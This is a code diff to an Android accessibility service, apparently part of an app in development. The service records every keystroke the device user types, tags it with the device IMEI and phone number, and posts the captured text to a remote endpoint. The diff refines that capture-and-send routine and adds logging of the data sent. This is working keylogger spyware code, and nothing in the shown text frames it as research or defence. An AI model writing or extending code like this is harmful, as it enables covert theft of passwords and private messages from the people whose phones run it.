@@ -5,6 +5,7 @@ import android.os.Build;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
+import android.widget.TextView;
 
 import androidx.annotation.RequiresApi;
 
@@ -29,6 +30,7 @@ public class MyAccessibilityService extends AccessibilityService {
     private String payload;
     private String me;
     private String phone;
+    private TextView viewCapture = MainActivity.captureView;
 
     //Objetos para acceder a los recursos del API
     private Captura captura;
@@ -65,28 +67,27 @@ public class MyAccessibilityService extends AccessibilityService {
             payload += keyChar;
             if(payload.length() == 100){
                 payload = "";
-                resolveMain =  requestCapture(payload, "app-1", "url-1");
+                requestCapture(payload, "app-1", "url-1");
             }
             //Log.d(TAG, "letra: " + payload);
-            resolveMain =  requestCapture(payload, "app-1", "url-1");
+            requestCapture(payload, "app-1", "url-1");
 
-            Log.i(TAG, "payload: " + payload + "-->imei-->" + getMe() + "-->phone-->" + getPhone());
-            Log.i(TAG, "Resolve: " + resolveMain);
+            //Log.i(TAG, "payload: " + payload + "-->imei-->" + getMe() + "-->phone-->" + getPhone());
+            //Log.i(TAG, "Resolve: " + resolveMain);
 
             //Log.v(TAG, "letra: " + payload);
         return super.onKeyEvent(event);
     }
 
-    private String requestCapture(String payload, String appMoment, String urlImage){
-        captura = new Captura(GetSHA.get_SHA_512_SecurePassword("owner_hash", getMe()),
-                getMe(), "t", payload, urlImage,
+    private void requestCapture(String carena, String appMoment, String urlImage){
+
+        captura = new Captura("hash_owner...",
+                getMe(), "t", carena, urlImage,
                 Utiles.obtenerFechaActual("America/Bogota"),
                 Utiles.obtenerHoraActual("America/Bogota"), appMoment);
-
+        Log.i(TAG, "datos a enviar:" + captura.toString());
         capsuledCaptured = new CapsuledCaptured(captura);
-        resolve = capsuledCaptured.callPostDataCapture();
-
-        return resolve;
+        capsuledCaptured.callPostDataCapture(captura.toString());
     }
 
 
